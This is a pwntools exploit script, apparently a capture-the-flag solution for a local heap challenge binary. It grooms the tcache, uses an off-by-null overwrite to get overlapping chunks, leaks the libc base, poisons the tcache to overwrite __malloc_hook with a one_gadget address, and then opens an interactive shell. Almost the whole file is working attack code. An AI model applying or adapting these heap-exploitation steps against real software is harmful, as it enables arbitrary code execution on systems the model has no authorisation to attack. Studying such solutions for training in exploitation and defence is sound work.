from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'Your choice: '
def add(size, data):
	sla(menu, b'1')
	sla(b'Size:', byte(size))
	sda(b'Data:', data)

def show(idx):
	sla(menu, b'2')
	sla(b'Index:', byte(idx))

def dele(idx):
	sla(menu, b'3')
	sla(b'Index:', byte(idx))

for i in range(7):
	add(0xF8, b'0\n')
add(0xE8, b'0\n')
add(0xF8, b'0\n')
add(0xF8, b'0\n')

for i in range(6):
	dele(i)
dele(9)
dele(6)
dele(7)
add(0xE8, b'A'*0xE8)
for i in range(6):
	dele(0)
	add(0xE7-i, b'A'*(0xE7-i))
dele(0)
add(0xE2, b'A'*0xE0+b'\xf0\x01')
dele(8)

for i in range(7):
	add(0xF8, b'1\n')
add(0xF8, b'1\n')
show(0)
libc.address = addr64(b'\n') - 0x3ebca0
print("\033[32m[libc_base -> "+str(hex(libc.address))+"]\033[0m")
add(0xE8, b'2\n')

for i in range(1, 8):
	dele(i)

ones = [0x4f2c5, 0x4f322, 0x10a38c]
ones = [i+libc.address for i in ones]
free_hook = libc.sym.__free_hook
malloc_hook = libc.sym.__malloc_hook
add(0xE8, b'3\n')
add(0xE8, b'3\n')
add(0xE8, b'3\n')
dele(2)
dele(0)
dele(3)
dele(9)

add(0xE8, p64(malloc_hook))
add(0xE8, b'4\n')
add(0xE8, b'4\n')
add(0xE8, p64(ones[2]))
sla(menu, b'1')
sla(b'Size:', byte(0xF8))
#debug()
sh()
